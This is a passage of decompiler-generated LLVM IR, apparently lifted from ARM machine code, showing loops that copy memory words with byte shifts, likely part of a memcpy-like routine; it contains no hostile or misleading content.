  %v4_181dc = and i32 %v3_181dc, %v0_181e4
  %v5_181dc = icmp slt i32 %v4_181dc, 0
  store i1 %v5_181dc, i1* %cpsr_v.global-to-local, align 1
  %v6_181dc = icmp slt i32 %v1_181dc, 0
  store i1 %v6_181dc, i1* %cpsr_n.global-to-local, align 1
  %v7_181dc = icmp eq i32 %v0_181e4, 12
  store i1 %v7_181dc, i1* %cpsr_z.global-to-local, align 1
  %v2_181e0 = xor i1 %v6_181dc, %v5_181dc
  switch i2 %v0_18164.off0, label %dec_label_pc_18170 [
    i2 -1, label %dec_label_pc_18248
    i2 -2, label %dec_label_pc_181dc
  ]

dec_label_pc_18170:                               ; preds = %dec_label_pc_1815c
  br i1 %v2_181e0, label %dec_label_pc_181bc, label %dec_label_pc_18178

dec_label_pc_18178:                               ; preds = %dec_label_pc_18170
  store i32 %v1_181dc, i32* %r2.global-to-local, align 4
  %v3_1817c = load i32, i32* @r4, align 4
  store i32 %v3_1817c, i32* %stack_var_-16, align 4
  %v6_1817c = load i32, i32* @r5, align 4
  store i32 %v6_1817c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18180

dec_label_pc_18180:                               ; preds = %dec_label_pc_18180.dec_label_pc_18180_crit_edge, %dec_label_pc_18178
  %v0_181a4 = phi i32 [ %v12_181a4, %dec_label_pc_18180.dec_label_pc_18180_crit_edge ], [ %v0_1827c76, %dec_label_pc_18178 ]
  %v0_18184 = phi i32 [ %v0_18184.pre, %dec_label_pc_18180.dec_label_pc_18180_crit_edge ], [ %v4_18160, %dec_label_pc_18178 ]
  %v0_18180 = phi i32 [ %v0_18180.pre, %dec_label_pc_18180.dec_label_pc_18180_crit_edge ], [ %v2_18160, %dec_label_pc_18178 ]
  %v3_18180 = udiv i32 %v0_18180, 256
  %v1_18184 = inttoptr i32 %v0_18184 to i32*
  %v2_18184 = load i32, i32* %v1_18184, align 4
  store i32 %v2_18184, i32* %r4.global-to-local, align 4
  %v3_18184 = add i32 %v0_18184, 4
  %v4_18184 = inttoptr i32 %v3_18184 to i32*
  %v5_18184 = load i32, i32* %v4_18184, align 4
  store i32 %v5_18184, i32* %r5.global-to-local, align 4
  %v6_18184 = add i32 %v0_18184, 8
  %v7_18184 = inttoptr i32 %v6_18184 to i32*
  %v8_18184 = load i32, i32* %v7_18184, align 4
  store i32 %v8_18184, i32* %ip.global-to-local, align 4
  %v9_18184 = add i32 %v0_18184, 12
  %v10_18184 = inttoptr i32 %v9_18184 to i32*
  %v11_18184 = load i32, i32* %v10_18184, align 4
  store i32 %v11_18184, i32* %lr.global-to-local, align 4
  %v12_18184 = add i32 %v0_18184, 16
  store i32 %v12_18184, i32* %r1.global-to-local, align 4
  %v4_18188 = mul i32 %v2_18184, 16777216
  %v5_18188 = or i32 %v4_18188, %v3_18180
  store i32 %v5_18188, i32* @r3, align 4
  %v3_1818c = udiv i32 %v2_18184, 256
  %v4_18190 = mul i32 %v5_18184, 16777216
  %v5_18190 = or i32 %v4_18190, %v3_1818c
  store i32 %v5_18190, i32* %r4.global-to-local, align 4
  %v3_18194 = udiv i32 %v5_18184, 256
  %v4_18198 = mul i32 %v8_18184, 16777216
  %v5_18198 = or i32 %v4_18198, %v3_18194
  store i32 %v5_18198, i32* %r5.global-to-local, align 4
  %v3_1819c = udiv i32 %v8_18184, 256
  %v4_181a0 = mul i32 %v11_18184, 16777216
  %v5_181a0 = or i32 %v4_181a0, %v3_1819c
  store i32 %v5_181a0, i32* @ip, align 4
  %v1_181a4 = inttoptr i32 %v0_181a4 to i32*
  store i32 %v5_18188, i32* %v1_181a4, align 4
  %v3_181a4 = add i32 %v0_181a4, 4
  %v4_181a4 = inttoptr i32 %v3_181a4 to i32*
  %v5_181a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_181a4, i32* %v4_181a4, align 4
  %v6_181a4 = add i32 %v0_181a4, 8
  %v7_181a4 = inttoptr i32 %v6_181a4 to i32*
  %v8_181a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_181a4, i32* %v7_181a4, align 4
  %v9_181a4 = add i32 %v0_181a4, 12
  %v10_181a4 = inttoptr i32 %v9_181a4 to i32*
  %v11_181a4 = load i32, i32* @ip, align 4
  store i32 %v11_181a4, i32* %v10_181a4, align 4
  %v12_181a4 = add i32 %v0_181a4, 16
  store i32 %v12_181a4, i32* @r0, align 4
  %v0_181a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_181a8 = add i32 %v0_181a8, -16
  store i32 %v1_181a8, i32* %r2.global-to-local, align 4
  %v3_181a8 = sub i32 15, %v0_181a8
  %v4_181a8 = and i32 %v3_181a8, %v0_181a8
  %v5_181a8 = icmp slt i32 %v4_181a8, 0
  %v6_181a8 = icmp slt i32 %v1_181a8, 0
  %v2_181ac = xor i1 %v6_181a8, %v5_181a8
  br i1 %v2_181ac, label %dec_label_pc_181b0, label %dec_label_pc_18180.dec_label_pc_18180_crit_edge

dec_label_pc_18180.dec_label_pc_18180_crit_edge:  ; preds = %dec_label_pc_18180
  %v0_18180.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18184.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18180

dec_label_pc_181b0:                               ; preds = %dec_label_pc_18180
  %v2_181b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_181b0, i32* @r4, align 4
  %v5_181b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_181b0, i32* @r5, align 4
  %v1_181b4 = add i32 %v0_181a8, -4
  store i32 %v1_181b4, i32* %r2.global-to-local, align 4
  %v3_181b4 = add i32 %v0_181a8, 2147483632
  %v4_181b4 = and i32 %v1_181b4, %v3_181b4
  %v5_181b4 = icmp slt i32 %v4_181b4, 0
  store i1 %v5_181b4, i1* %cpsr_v.global-to-local, align 1
  %v6_181b4 = icmp slt i32 %v1_181b4, 0
  store i1 %v6_181b4, i1* %cpsr_n.global-to-local, align 1
  %v7_181b4 = icmp eq i32 %v1_181b4, 0
  store i1 %v7_181b4, i1* %cpsr_z.global-to-local, align 1
  %v2_181b8 = xor i1 %v6_181b4, %v5_181b4
  br i1 %v2_181b8, label %dec_label_pc_181d4, label %dec_label_pc_181bc

dec_label_pc_181bc:                               ; preds = %dec_label_pc_181b0, %dec_label_pc_18170, %dec_label_pc_181bc
  %v1_181c8 = phi i32 [ %v4_181c8, %dec_label_pc_181bc ], [ %v12_181a4, %dec_label_pc_181b0 ], [ %v0_1827c76, %dec_label_pc_18170 ]
  %v0_181bc = load i32, i32* %lr.global-to-local, align 4
  %v3_181bc = udiv i32 %v0_181bc, 256
  store i32 %v3_181bc, i32* %ip.global-to-local, align 4
  %v0_181c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_181c0 = inttoptr i32 %v0_181c0 to i32*
  %v2_181c0 = load i32, i32* %v1_181c0, align 4
  store i32 %v2_181c0, i32* %lr.global-to-local, align 4
  %v4_181c0 = add i32 %v0_181c0, 4
  store i32 %v4_181c0, i32* %r1.global-to-local, align 4
  %v4_181c4 = mul i32 %v2_181c0, 16777216
  %v5_181c4 = or i32 %v4_181c4, %v3_181bc
  store i32 %v5_181c4, i32* @ip, align 4
  %v2_181c8 = inttoptr i32 %v1_181c8 to i32*
  store i32 %v5_181c4, i32* %v2_181c8, align 4
  %v3_181c8 = load i32, i32* @r0, align 4
  %v4_181c8 = add i32 %v3_181c8, 4
  store i32 %v4_181c8, i32* @r0, align 4
  %v0_181cc = load i32, i32* %r2.global-to-local, align 4
  %v1_181cc = add i32 %v0_181cc, -4
  store i32 %v1_181cc, i32* %r2.global-to-local, align 4
  %v3_181cc = sub i32 3, %v0_181cc
  %v4_181cc = and i32 %v3_181cc, %v0_181cc
  %v5_181cc = icmp slt i32 %v4_181cc, 0
  %v6_181cc = icmp slt i32 %v1_181cc, 0
  %v2_181d0 = xor i1 %v6_181cc, %v5_181cc
  br i1 %v2_181d0, label %dec_label_pc_181d4.loopexit, label %dec_label_pc_181bc

dec_label_pc_181d4.loopexit:                      ; preds = %dec_label_pc_181bc
  %v7_181cc = icmp eq i32 %v0_181cc, 4
  store i1 %v5_181cc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_181cc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_181cc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_181d4

dec_label_pc_181d4:                               ; preds = %dec_label_pc_181d4.loopexit, %dec_label_pc_181b0
  %v0_180fc59 = phi i32 [ %v1_181cc, %dec_label_pc_181d4.loopexit ], [ %v1_181b4, %dec_label_pc_181b0 ]
  %v0_181d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_181d4 = add i32 %v0_181d4, -3
  store i32 %v1_181d4, i32* @r1, align 4
  br label %bb140

dec_label_pc_181dc:                               ; preds = %dec_label_pc_1815c
  br i1 %v2_181e0, label %dec_label_pc_18228, label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %dec_label_pc_181dc
  store i32 %v1_181dc, i32* %r2.global-to-local, align 4
  %v3_181e8 = load i32, i32* @r4, align 4
  store i32 %v3_181e8, i32* %stack_var_-16, align 4
  %v6_181e8 = load i32, i32* @r5, align 4
  store i32 %v6_181e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_181ec

dec_label_pc_181ec:                               ; preds = %dec_label_pc_181ec.dec_label_pc_181ec_crit_edge, %dec_label_pc_181e4
  %v0_18210 = phi i32 [ %v12_18210, %dec_label_pc_181ec.dec_label_pc_181ec_crit_edge ], [ %v0_1827c76, %dec_label_pc_181e4 ]
  %v0_181f0 = phi i32 [ %v0_181f0.pre, %dec_label_pc_181ec.dec_label_pc_181ec_crit_edge ], [ %v4_18160, %dec_label_pc_181e4 ]
  %v0_181ec = phi i32 [ %v0_181ec.pre, %dec_label_pc_181ec.dec_label_pc_181ec_crit_edge ], [ %v2_18160, %dec_label_pc_181e4 ]
  %v3_181ec = udiv i32 %v0_181ec, 65536
  %v1_181f0 = inttoptr i32 %v0_181f0 to i32*
  %v2_181f0 = load i32, i32* %v1_181f0, align 4
  store i32 %v2_181f0, i32* %r4.global-to-local, align 4
  %v3_181f0 = add i32 %v0_181f0, 4
  %v4_181f0 = inttoptr i32 %v3_181f0 to i32*
  %v5_181f0 = load i32, i32* %v4_181f0, align 4
  store i32 %v5_181f0, i32* %r5.global-to-local, align 4
  %v6_181f0 = add i32 %v0_181f0, 8
  %v7_181f0 = inttoptr i32 %v6_181f0 to i32*
  %v8_181f0 = load i32, i32* %v7_181f0, align 4
  store i32 %v8_181f0, i32* %ip.global-to-local, align 4
  %v9_181f0 = add i32 %v0_181f0, 12
  %v10_181f0 = inttoptr i32 %v9_181f0 to i32*
  %v11_181f0 = load i32, i32* %v10_181f0, align 4
  store i32 %v11_181f0, i32* %lr.global-to-local, align 4
  %v12_181f0 = add i32 %v0_181f0, 16
  store i32 %v12_181f0, i32* %r1.global-to-local, align 4
  %v4_181f4 = mul i32 %v2_181f0, 65536
  %v5_181f4 = or i32 %v4_181f4, %v3_181ec
  store i32 %v5_181f4, i32* @r3, align 4
  %v3_181f8 = udiv i32 %v2_181f0, 65536
  %v4_181fc = mul i32 %v5_181f0, 65536
  %v5_181fc = or i32 %v4_181fc, %v3_181f8
  store i32 %v5_181fc, i32* %r4.global-to-local, align 4
  %v3_18200 = udiv i32 %v5_181f0, 65536
  %v4_18204 = mul i32 %v8_181f0, 65536
  %v5_18204 = or i32 %v4_18204, %v3_18200
  store i32 %v5_18204, i32* %r5.global-to-local, align 4
  %v3_18208 = udiv i32 %v8_181f0, 65536
  %v4_1820c = mul i32 %v11_181f0, 65536
  %v5_1820c = or i32 %v4_1820c, %v3_18208
  store i32 %v5_1820c, i32* @ip, align 4
  %v1_18210 = inttoptr i32 %v0_18210 to i32*
  store i32 %v5_181f4, i32* %v1_18210, align 4
  %v3_18210 = add i32 %v0_18210, 4
  %v4_18210 = inttoptr i32 %v3_18210 to i32*
  %v5_18210 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18210, i32* %v4_18210, align 4
  %v6_18210 = add i32 %v0_18210, 8
  %v7_18210 = inttoptr i32 %v6_18210 to i32*
  %v8_18210 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18210, i32* %v7_18210, align 4
  %v9_18210 = add i32 %v0_18210, 12
  %v10_18210 = inttoptr i32 %v9_18210 to i32*
  %v11_18210 = load i32, i32* @ip, align 4
  store i32 %v11_18210, i32* %v10_18210, align 4
  %v12_18210 = add i32 %v0_18210, 16
  store i32 %v12_18210, i32* @r0, align 4
  %v0_18214 = load i32, i32* %r2.global-to-local, align 4
  %v1_18214 = add i32 %v0_18214, -16
  store i32 %v1_18214, i32* %r2.global-to-local, align 4
  %v3_18214 = sub i32 15, %v0_18214
  %v4_18214 = and i32 %v3_18214, %v0_18214
  %v5_18214 = icmp slt i32 %v4_18214, 0
  %v6_18214 = icmp slt i32 %v1_18214, 0
  %v2_18218 = xor i1 %v6_18214, %v5_18214
  br i1 %v2_18218, label %dec_label_pc_1821c, label %dec_label_pc_181ec.dec_label_pc_181ec_crit_edge

dec_label_pc_181ec.dec_label_pc_181ec_crit_edge:  ; preds = %dec_label_pc_181ec
  %v0_181ec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_181f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181ec

dec_label_pc_1821c:                               ; preds = %dec_label_pc_181ec
  %v2_1821c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1821c, i32* @r4, align 4
  %v5_1821c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1821c, i32* @r5, align 4
  %v1_18220 = add i32 %v0_18214, -4
  store i32 %v1_18220, i32* %r2.global-to-local, align 4
  %v3_18220 = add i32 %v0_18214, 2147483632
  %v4_18220 = and i32 %v1_18220, %v3_18220
  %v5_18220 = icmp slt i32 %v4_18220, 0
  store i1 %v5_18220, i1* %cpsr_v.global-to-local, align 1
  %v6_18220 = icmp slt i32 %v1_18220, 0
  store i1 %v6_18220, i1* %cpsr_n.global-to-local, align 1
  %v7_18220 = icmp eq i32 %v1_18220, 0
  store i1 %v7_18220, i1* %cpsr_z.global-to-local, align 1
  %v2_18224 = xor i1 %v6_18220, %v5_18220
  br i1 %v2_18224, label %dec_label_pc_18240, label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_1821c, %dec_label_pc_181dc, %dec_label_pc_18228
  %v1_18234 = phi i32 [ %v4_18234, %dec_label_pc_18228 ], [ %v12_18210, %dec_label_pc_1821c ], [ %v0_1827c76, %dec_label_pc_181dc ]
  %v0_18228 = load i32, i32* %lr.global-to-local, align 4
  %v3_18228 = udiv i32 %v0_18228, 65536
  store i32 %v3_18228, i32* %ip.global-to-local, align 4
  %v0_1822c = load i32, i32* %r1.global-to-local, align 4
  %v1_1822c = inttoptr i32 %v0_1822c to i32*
  %v2_1822c = load i32, i32* %v1_1822c, align 4
  store i32 %v2_1822c, i32* %lr.global-to-local, align 4
  %v4_1822c = add i32 %v0_1822c, 4
  store i32 %v4_1822c, i32* %r1.global-to-local, align 4
  %v4_18230 = mul i32 %v2_1822c, 65536
  %v5_18230 = or i32 %v4_18230, %v3_18228
  store i32 %v5_18230, i32* @ip, align 4
  %v2_18234 = inttoptr i32 %v1_18234 to i32*
  store i32 %v5_18230, i32* %v2_18234, align 4
  %v3_18234 = load i32, i32* @r0, align 4
  %v4_18234 = add i32 %v3_18234, 4
  store i32 %v4_18234, i32* @r0, align 4
  %v0_18238 = load i32, i32* %r2.global-to-local, align 4
  %v1_18238 = add i32 %v0_18238, -4
  store i32 %v1_18238, i32* %r2.global-to-local, align 4
  %v3_18238 = sub i32 3, %v0_18238
  %v4_18238 = and i32 %v3_18238, %v0_18238
  %v5_18238 = icmp slt i32 %v4_18238, 0
  %v6_18238 = icmp slt i32 %v1_18238, 0
  %v2_1823c = xor i1 %v6_18238, %v5_18238
  br i1 %v2_1823c, label %dec_label_pc_18240.loopexit, label %dec_label_pc_18228

dec_label_pc_18240.loopexit:                      ; preds = %dec_label_pc_18228
  %v7_18238 = icmp eq i32 %v0_18238, 4
  store i1 %v5_18238, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18238, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18238, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18240

dec_label_pc_18240:                               ; preds = %dec_label_pc_18240.loopexit, %dec_label_pc_1821c
  %v0_180fc60 = phi i32 [ %v1_18238, %dec_label_pc_18240.loopexit ], [ %v1_18220, %dec_label_pc_1821c ]
  %v0_18240 = load i32, i32* %r1.global-to-local, align 4
  %v1_18240 = add i32 %v0_18240, -2
  store i32 %v1_18240, i32* @r1, align 4
  br label %bb140

dec_label_pc_18248:                               ; preds = %dec_label_pc_1815c
  br i1 %v2_181e0, label %dec_label_pc_18294, label %dec_label_pc_18250

dec_label_pc_18250:                               ; preds = %dec_label_pc_18248
  store i32 %v1_181dc, i32* %r2.global-to-local, align 4
  %v3_18254 = load i32, i32* @r4, align 4
  store i32 %v3_18254, i32* %stack_var_-16, align 4
  %v6_18254 = load i32, i32* @r5, align 4
  store i32 %v6_18254, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18258

dec_label_pc_18258:                               ; preds = %dec_label_pc_18258.dec_label_pc_18258_crit_edge, %dec_label_pc_18250
  %v0_1827c = phi i32 [ %v12_1827c, %dec_label_pc_18258.dec_label_pc_18258_crit_edge ], [ %v0_1827c76, %dec_label_pc_18250 ]
  %v0_1825c = phi i32 [ %v0_1825c.pre, %dec_label_pc_18258.dec_label_pc_18258_crit_edge ], [ %v4_18160, %dec_label_pc_18250 ]
  %v0_18258 = phi i32 [ %v0_18258.pre, %dec_label_pc_18258.dec_label_pc_18258_crit_edge ], [ %v2_18160, %dec_label_pc_18250 ]
  %v3_18258 = udiv i32 %v0_18258, 16777216
  %v1_1825c = inttoptr i32 %v0_1825c to i32*
  %v2_1825c = load i32, i32* %v1_1825c, align 4
  store i32 %v2_1825c, i32* %r4.global-to-local, align 4
  %v3_1825c = add i32 %v0_1825c, 4
  %v4_1825c = inttoptr i32 %v3_1825c to i32*
  %v5_1825c = load i32, i32* %v4_1825c, align 4
  store i32 %v5_1825c, i32* %r5.global-to-local, align 4
  %v6_1825c = add i32 %v0_1825c, 8
  %v7_1825c = inttoptr i32 %v6_1825c to i32*
  %v8_1825c = load i32, i32* %v7_1825c, align 4
  store i32 %v8_1825c, i32* %ip.global-to-local, align 4
  %v9_1825c = add i32 %v0_1825c, 12
  %v10_1825c = inttoptr i32 %v9_1825c to i32*
  %v11_1825c = load i32, i32* %v10_1825c, align 4
  store i32 %v11_1825c, i32* %lr.global-to-local, align 4
  %v12_1825c = add i32 %v0_1825c, 16
  store i32 %v12_1825c, i32* %r1.global-to-local, align 4
  %v4_18260 = mul i32 %v2_1825c, 256
  %v5_18260 = or i32 %v4_18260, %v3_18258
  store i32 %v5_18260, i32* @r3, align 4
  %v3_18264 = udiv i32 %v2_1825c, 16777216
  %v4_18268 = mul i32 %v5_1825c, 256
  %v5_18268 = or i32 %v4_18268, %v3_18264
  store i32 %v5_18268, i32* %r4.global-to-local, align 4
  %v3_1826c = udiv i32 %v5_1825c, 16777216
  %v4_18270 = mul i32 %v8_1825c, 256
  %v5_18270 = or i32 %v4_18270, %v3_1826c
  store i32 %v5_18270, i32* %r5.global-to-local, align 4
  %v3_18274 = udiv i32 %v8_1825c, 16777216
  %v4_18278 = mul i32 %v11_1825c, 256
  %v5_18278 = or i32 %v4_18278, %v3_18274
  store i32 %v5_18278, i32* @ip, align 4
  %v1_1827c = inttoptr i32 %v0_1827c to i32*
  store i32 %v5_18260, i32* %v1_1827c, align 4
  %v3_1827c = add i32 %v0_1827c, 4
  %v4_1827c = inttoptr i32 %v3_1827c to i32*
  %v5_1827c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1827c, i32* %v4_1827c, align 4
  %v6_1827c = add i32 %v0_1827c, 8
  %v7_1827c = inttoptr i32 %v6_1827c to i32*
  %v8_1827c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1827c, i32* %v7_1827c, align 4
  %v9_1827c = add i32 %v0_1827c, 12
  %v10_1827c = inttoptr i32 %v9_1827c to i32*
  %v11_1827c = load i32, i32* @ip, align 4
  store i32 %v11_1827c, i32* %v10_1827c, align 4
  %v12_1827c = add i32 %v0_1827c, 16
  store i32 %v12_1827c, i32* @r0, align 4
  %v0_18280 = load i32, i32* %r2.global-to-local, align 4
  %v1_18280 = add i32 %v0_18280, -16
  store i32 %v1_18280, i32* %r2.global-to-local, align 4
  %v3_18280 = sub i32 15, %v0_18280
  %v4_18280 = and i32 %v3_18280, %v0_18280
  %v5_18280 = icmp slt i32 %v4_18280, 0
  %v6_18280 = icmp slt i32 %v1_18280, 0
  %v2_18284 = xor i1 %v6_18280, %v5_18280
  br i1 %v2_18284, label %dec_label_pc_18288, label %dec_label_pc_18258.dec_label_pc_18258_crit_edge

dec_label_pc_18258.dec_label_pc_18258_crit_edge:  ; preds = %dec_label_pc_18258
  %v0_18258.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1825c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18258

dec_label_pc_18288:                               ; preds = %dec_label_pc_18258
  %v2_18288 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18288, i32* @r4, align 4
  %v5_18288 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18288, i32* @r5, align 4
  %v1_1828c = add i32 %v0_18280, -4
  store i32 %v1_1828c, i32* %r2.global-to-local, align 4
  %v3_1828c = add i32 %v0_18280, 2147483632
  %v4_1828c = and i32 %v1_1828c, %v3_1828c
  %v5_1828c = icmp slt i32 %v4_1828c, 0
  store i1 %v5_1828c, i1* %cpsr_v.global-to-local, align 1
  %v6_1828c = icmp slt i32 %v1_1828c, 0
  store i1 %v6_1828c, i1* %cpsr_n.global-to-local, align 1
  %v7_1828c = icmp eq i32 %v1_1828c, 0
  store i1 %v7_1828c, i1* %cpsr_z.global-to-local, align 1
  %v2_18290 = xor i1 %v6_1828c, %v5_1828c
  br i1 %v2_18290, label %dec_label_pc_182ac, label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %dec_label_pc_18288, %dec_label_pc_18248, %dec_label_pc_18294
  %v1_182a0 = phi i32 [ %v4_182a0, %dec_label_pc_18294 ], [ %v12_1827c, %dec_label_pc_18288 ], [ %v0_1827c76, %dec_label_pc_18248 ]
  %v0_18294 = load i32, i32* %lr.global-to-local, align 4
  %v3_18294 = udiv i32 %v0_18294, 16777216
  store i32 %v3_18294, i32* %ip.global-to-local, align 4
  %v0_18298 = load i32, i32* %r1.global-to-local, align 4
  %v1_18298 = inttoptr i32 %v0_18298 to i32*
  %v2_18298 = load i32, i32* %v1_18298, align 4
  store i32 %v2_18298, i32* %lr.global-to-local, align 4
  %v4_18298 = add i32 %v0_18298, 4
  store i32 %v4_18298, i32* %r1.global-to-local, align 4
  %v4_1829c = mul i32 %v2_18298, 256
  %v5_1829c = or i32 %v4_1829c, %v3_18294
  store i32 %v5_1829c, i32* @ip, align 4
  %v2_182a0 = inttoptr i32 %v1_182a0 to i32*
  store i32 %v5_1829c, i32* %v2_182a0, align 4
  %v3_182a0 = load i32, i32* @r0, align 4
  %v4_182a0 = add i32 %v3_182a0, 4
  store i32 %v4_182a0, i32* @r0, align 4
  %v0_182a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_182a4 = add i32 %v0_182a4, -4
  store i32 %v1_182a4, i32* %r2.global-to-local, align 4
  %v3_182a4 = sub i32 3, %v0_182a4
  %v4_182a4 = and i32 %v3_182a4, %v0_182a4
  %v5_182a4 = icmp slt i32 %v4_182a4, 0
  %v6_182a4 = icmp slt i32 %v1_182a4, 0
  %v2_182a8 = xor i1 %v6_182a4, %v5_182a4
  br i1 %v2_182a8, label %dec_label_pc_182ac.loopexit, label %dec_label_pc_18294

dec_label_pc_182ac.loopexit:                      ; preds = %dec_label_pc_18294
  %v7_182a4 = icmp eq i32 %v0_182a4, 4
  store i1 %v5_182a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_182a4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_182a4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_182ac

dec_label_pc_182ac:                               ; preds = %dec_label_pc_182ac.loopexit, %dec_label_pc_18288
  %v0_180fc61 = phi i32 [ %v1_182a4, %dec_label_pc_182ac.loopexit ], [ %v1_1828c, %dec_label_pc_18288 ]
  %v0_182ac = load i32, i32* %r1.global-to-local, align 4
  %v1_182ac = add i32 %v0_182ac, -1
  store i32 %v1_182ac, i32* @r1, align 4
  br label %bb140

dec_label_pc_182b4:                               ; preds = %entry
  %v1_182b4 = load i32, i32* @r2, align 4
  %v2_182b4 = add i32 %v1_182b4, %v0_18060
  store i32 %v2_182b4, i32* %r1.global-to-local, align 4
  %v2_182b8 = add i32 %v1_182b4, %v1_18060
  store i32 %v2_182b8, i32* %r0.global-to-local, align 4
  %v2_182bc = add i32 %v1_182b4, -4
  store i32 %v2_182bc, i32* %r2.global-to-local, align 4
  %v4_182bc = sub i32 3, %v1_182b4
  %v5_182bc = and i32 %v4_182bc, %v1_182b4
  %v6_182bc = icmp slt i32 %v5_182bc, 0
  store i1 %v6_182bc, i1* %cpsr_v.global-to-local, align 1
  %v7_182bc = icmp slt i32 %v2_182bc, 0
  store i1 %v7_182bc, i1* %cpsr_n.global-to-local, align 1
  %v8_182bc = icmp eq i32 %v1_182b4, 4
  store i1 %v8_182bc, i1* %cpsr_z.global-to-local, align 1
  %v5_182c0 = icmp slt i32 %v1_182b4, 4
  br i1 %v5_182c0, label %bb150, label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_182b4
  %v1_182c4 = urem i32 %v2_182b8, 4
  store i32 %v1_182c4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_182c4 = icmp eq i32 %v1_182c4, 0
  store i1 %v2_182c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182c4, label %dec_label_pc_182cc, label %dec_label_pc_1836c

dec_label_pc_182cc:                               ; preds = %dec_label_pc_182c4
  %v1_182cc = urem i32 %v2_182b4, 4
  store i32 %v1_182cc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_182cc = icmp eq i32 %v1_182cc, 0
  store i1 %v2_182cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182cc, label %dec_label_pc_182d4, label %dec_label_pc_18398

dec_label_pc_182d4:                               ; preds = %dec_label_pc_182cc, %dec_label_pc_18390
  %v0_182ec37 = phi i32 [ %v2_182b8, %dec_label_pc_182cc ], [ %v0_183e020, %dec_label_pc_18390 ]
  %v0_182e836 = phi i32 [ %v2_182b4, %dec_label_pc_182cc ], [ %v0_18390, %dec_label_pc_18390 ]
  %v0_182d4 = phi i32 [ %v2_182bc, %dec_label_pc_182cc ], [ %v2_18388, %dec_label_pc_18390 ]
  %v2_182d4 = add i32 %v0_182d4, -8
  store i32 %v2_182d4, i32* %r2.global-to-local, align 4
  %v4_182d4 = sub i32 7, %v0_182d4
  %v5_182d4 = and i32 %v4_182d4, %v0_182d4
  %v6_182d4 = icmp slt i32 %v5_182d4, 0
  store i1 %v6_182d4, i1* %cpsr_v.global-to-local, align 1
  %v7_182d4 = icmp slt i32 %v2_182d4, 0
  store i1 %v7_182d4, i1* %cpsr_n.global-to-local, align 1
  %v8_182d4 = icmp eq i32 %v0_182d4, 8
  store i1 %v8_182d4, i1* %cpsr_z.global-to-local, align 1
  %v5_182d8 = icmp slt i32 %v0_182d4, 8
  br i1 %v5_182d8, label %dec_label_pc_18324, label %dec_label_pc_182dc

dec_label_pc_182dc:                               ; preds = %dec_label_pc_182d4
  %v3_182dc = load i32, i32* @r4, align 4
  %v5_182dc = inttoptr i32 %v3_182dc to i8*
  store i8* %v5_182dc, i8** %stack_var_-8, align 4
  %v8_182dc = load i32, i32* @lr, align 4
  %v2_182e0 = add i32 %v0_182d4, -28
  store i32 %v2_182e0, i32* %r2.global-to-local, align 4
  %v4_182e0 = sub i32 27, %v0_182d4
  %v5_182e0 = and i32 %v4_182e0, %v2_182d4
  %v6_182e0 = icmp slt i32 %v5_182e0, 0
  store i1 %v6_182e0, i1* %cpsr_v.global-to-local, align 1
  %v7_182e0 = icmp slt i32 %v2_182e0, 0
  store i1 %v7_182e0, i1* %cpsr_n.global-to-local, align 1
  %v8_182e0 = icmp eq i32 %v2_182d4, 20
  store i1 %v8_182e0, i1* %cpsr_z.global-to-local, align 1
  %v5_182e4 = icmp slt i32 %v2_182d4, 20
  br i1 %v5_182e4, label %dec_label_pc_18300, label %dec_label_pc_182e8

dec_label_pc_182e8:                               ; preds = %dec_label_pc_182dc, %dec_label_pc_182e8.dec_label_pc_182e8_crit_edge
  %v0_182ec = phi i32 [ %v1_182f4, %dec_label_pc_182e8.dec_label_pc_182e8_crit_edge ], [ %v0_182ec37, %dec_label_pc_182dc ]
  %v0_182e8 = phi i32 [ %v0_182e8.pre, %dec_label_pc_182e8.dec_label_pc_182e8_crit_edge ], [ %v0_182e836, %dec_label_pc_182dc ]
  %v1_182e8 = add i32 %v0_182e8, -4
  %v2_182e8 = inttoptr i32 %v1_182e8 to i32*
  %v3_182e8 = load i32, i32* %v2_182e8, align 4
  %v4_182e8 = add i32 %v0_182e8, -8
  %v5_182e8 = inttoptr i32 %v4_182e8 to i32*
  %v6_182e8 = load i32, i32* %v5_182e8, align 4
  store i32 %v6_182e8, i32* %r4.global-to-local, align 4
